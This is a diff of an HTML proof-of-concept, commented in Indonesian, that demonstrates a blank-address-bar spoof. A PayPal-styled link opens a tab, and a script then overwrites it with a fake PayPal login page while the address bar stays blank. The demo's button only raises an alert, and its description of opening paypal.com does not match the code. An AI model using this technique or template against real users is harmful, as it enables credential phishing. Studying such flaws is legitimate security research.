@@ -1,49 +1,114 @@
-<script>
-function pwned() {
-var t = window.open('', 'ss');
-t.document.write(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <title>PayPal - Log In</title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-          font-family: Arial, sans-serif;
-          background: #f0f2f4;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          height: 100vh;
-        }
-        .container {
-          background: white;
-          width: 350px;
-          padding: 30px;
-          border-radius: 12px;
-          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-          text-align: center;
-        }
-        h1 { font-size: 24px; margin-bottom: 20px; color: #1c1e21; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; }
-        button { width: 100%; background: #0070ba; color: white; padding: 12px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
-        .warning { margin-top: 20px; font-size: 12px; color: red; }
-      </style>
-    </head>
-    <body>
-      <div class="container">
-        <h1>PayPal</h1>
-        <p style="color: #666;">Log in to your account</p>
-        <input type="email" placeholder="Email or mobile number">
-        <input type="password" placeholder="Password">
-        <button onclick="alert('Phishing demo: kredensial akan dicuri')">Log In</button>
-        <div class="warning">⚠️ This is a security research demo. Your address bar is blank.</div>
-      </div>
-    </body>
-    </html>
-  `);
-t.stop();
-}
-</script>
-<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PoC - Blank Address Bar Spoof</title>
+  <style>
+    /* Styling untuk tombol login mirip PayPal */
+    .paypal-button {
+      background-color: #ffc439;
+      background-image: linear-gradient(to bottom, #ffc439, #ffb347);
+      border: none;
+      border-radius: 25px;
+      color: #1c1c1c;
+      cursor: pointer;
+      display: inline-block;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 12px 30px;
+      text-decoration: none;
+      text-align: center;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    .paypal-button:hover {
+      background-color: #ffb347;
+      background-image: linear-gradient(to bottom, #ffb347, #ffa32e);
+      transform: scale(1.02);
+    }
+    .paypal-button:active {
+      transform: scale(0.98);
+    }
+    /* Container untuk demo */
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f9fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .note {
+      background: #fff3cd;
+      border-left: 5px solid #ffc107;
+      padding: 15px;
+      max-width: 500px;
+      font-size: 14px;
+      color: #856404;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    function pwned() {
+      var t = window.open('', 'ss');
+      t.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>PayPal - Log In</title>
+          <meta name="viewport" content="width=device-width, initial-scale=1">
+          <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+              font-family: Arial, sans-serif;
+              background: #f0f2f4;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              height: 100vh;
+            }
+            .container {
+              background: white;
+              width: 350px;
+              padding: 30px;
+              border-radius: 12px;
+              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+              text-align: center;
+            }
+            h1 { font-size: 24px; margin-bottom: 20px; color: #1c1e21; }
+            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; }
+            button { width: 100%; background: #0070ba; color: white; padding: 12px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
+            .warning { margin-top: 20px; font-size: 12px; color: red; }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <h1>PayPal</h1>
+            <p style="color: #666;">Log in to your account</p>
+            <input type="email" placeholder="Email or mobile number">
+            <input type="password" placeholder="Password">
+            <button onclick="alert('Phishing demo: kredensial akan dicuri')">Log In</button>
+            <div class="warning">⚠️ This is a security research demo. Your address bar is blank.</div>
+          </div>
+        </body>
+        </html>
+      `);
+      t.stop();
+    }
+  </script>
+
+  <!-- Tombol login berstyle PayPal, tetap menggunakan target="ss" dan onclick dengan setTimeout -->
+  <a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()', 500); return false;" class="paypal-button">
+    🔒 Login ke PayPal
+  </a>
+
+  <div class="note">
+    <strong>Catatan:</strong> Tombol ini akan membuka tab baru dengan <code>https://paypal.com</code>. Setelah 0.5 detik, konten tab akan diganti dengan halaman phishing palsu namun address bar tetap kosong (atau menampilkan URL tidak valid). Ini mendemonstrasikan kerentanan <strong>Blank Address Bar Spoof</strong> pada browser yang belum diperbaiki.
+  </div>
+</body>
+</html>
